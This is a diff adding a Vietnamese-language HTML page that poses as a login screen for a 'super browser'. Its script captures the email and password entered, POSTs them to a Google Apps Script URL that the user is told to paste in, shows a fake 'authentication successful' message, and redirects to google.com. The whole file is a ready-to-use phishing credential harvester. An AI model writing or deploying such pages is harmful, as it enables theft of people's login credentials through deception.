@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Trình Duyệt Siêu Cấp</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 80px; background: #f4f7f6; }
+        .box { background: white; padding: 40px; border-radius: 20px; display: inline-block; shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        h1 { color: #ff4757; }
+        input { display: block; width: 280px; padding: 12px; margin: 15px auto; border: 1px solid #ddd; border-radius: 8px; }
+        button { padding: 12px 30px; background: #ff4757; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🚀 TRÌNH DUYỆT</h1>
+        <p>Đăng nhập để bắt đầu trải nghiệm</p>
+        <input type="email" id="email" placeholder="Email của bạn">
+        <input type="password" id="pass" placeholder="Mật khẩu">
+        <button onclick="saveAndGo()">ĐĂNG NHẬP & VÀO WEB</button>
+    </div>
+
+    <script>
+        function saveAndGo() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            // DÁN LINK GOOGLE SCRIPT CỦA BẠN VÀO DƯỚI ĐÂY (Giữa hai dấu nháy)
+            const scriptURL = 'DÁN_LINK_CỦA_BẠN_Ở_ĐÂY';
+
+            if(!email || !pass) return alert("Vui lòng điền đủ thông tin!");
+
+            fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({email: email, password: pass})})
+            .then(() => {
+                alert("Xác thực thành công! Đang mở trang chủ...");
+                window.location.href = "https://www.google.com";
+            });
+        }
+    </script>
+</body>
+</html>
